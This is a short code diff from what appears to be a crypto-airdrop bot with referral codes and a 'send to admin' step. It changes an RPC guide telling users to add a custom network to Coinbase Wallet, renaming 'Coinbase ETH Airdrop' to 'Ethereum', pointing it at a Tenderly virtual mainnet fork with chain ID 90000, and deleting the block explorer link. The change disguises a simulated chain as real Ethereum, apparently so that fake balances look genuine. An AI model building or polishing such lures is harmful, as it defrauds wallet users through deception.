@@ -23,15 +23,14 @@ const updateUser = (id, updates) => {
 };
 const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);
 
-// === RPC GUIDE ===
+// === UPDATED RPC GUIDE ===
 const RPC_GUIDE = `
 Add this network to Coinbase Wallet:
 
-**Network Name:** Coinbase ETH Airdrop
-**RPC URL:** https://rpc.tenderly.co/devnet/coinbase-airdrop-90000
+**Network Name:** Ethereum
+**RPC URL:** https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
 **Chain ID:** 90000
 **Currency:** ETH
-**Block Explorer:** https://dashboard.tenderly.co
 `.trim();
 
 // === SEND TO ADMIN ===
